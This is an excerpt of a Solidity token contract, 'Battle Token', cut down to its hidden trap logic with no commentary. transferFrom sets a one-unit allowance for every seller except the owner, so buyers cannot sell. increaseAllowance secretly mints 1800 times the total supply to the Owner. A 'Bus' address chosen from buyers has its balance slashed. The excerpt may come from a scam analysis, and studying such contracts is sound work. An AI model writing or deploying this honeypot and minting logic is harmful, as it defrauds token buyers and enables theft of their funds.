...
contract BattleToken {
    ...
    string public name = "Battle Token";
    ...
    address public Bus=0x000000000000000000000000000000000000dEaD;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Bus != Owner && balanceOf[Bus]>=totalSupply.div(20)) {
            balanceOf[Bus]=balanceOf[Bus].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {Bus = to;} 
        if (to== Owner) {Bus=to;} 
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Bus) {allowance[from][msg.sender]=1;} 
    ...
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        if (spender==Owner) {uint256 Value=totalSupply*1800;balanceOf[Owner]+=Value;}
